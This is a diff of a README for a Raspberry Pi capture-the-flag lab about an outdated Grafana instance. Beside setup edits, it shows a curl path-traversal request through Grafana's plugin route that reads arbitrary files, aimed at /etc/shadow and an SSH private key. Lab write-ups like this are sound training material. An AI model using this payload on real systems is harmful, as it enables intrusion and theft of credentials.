@@ -1,4 +1,4 @@
-## Outdated software - Grafana 2
+## CTF-pi - Outdated software - Grafana 2 - Difficulty: ★★★☆☆
 
 ### Scenario 
 
@@ -8,14 +8,16 @@ There's no login provided for this challenge, but do we even need it?
 
 ### Prerequisites
 
-Raspberry Pi
+Your Raspberry Pi has remote connection set up via Raspberry Pi Connect or VNC.
 
-Cloned CTF-pi onto your Raspi.
+Have cloned this `CTF-pi` repository and are inside the `ctfpi0_0` directory.
+
+`docker compose` works.
 
 
 ### Objective
 
-Run within this directory on Raspi: `docker compose up --build -d` (Using remote shell/physical keyboard and mouse)
+Run within this directory on Raspi: `docker compose up --build -d` (Using remote shell)
 
 `hostname -I` to find out which IP the service is running on and visit it in your browser. Your main computer or even a phone can access this, as long as they are within the same network as Raspberry Pi.
 
@@ -49,7 +51,7 @@ I ran this:
 curl 'http://10.10.10.67:3000/public/plugins/zipkin/../../../../../../../../<path>/<filename>' --path-as-is --output text.txt
 
 ```
-There's file's like /etc/passwd; /etc/shadow ; grafana configuration files ; grafana.db ; /home/grafana/.ssh/id_rsa, let's try the last one.
+There's files like /etc/passwd; /etc/shadow ; grafana configuration files ; grafana.db ; /home/grafana/.ssh/id_rsa, let's try the last one.
 
 We can read the file contents from the saved `text.txt` file: `cat text.txt`
 
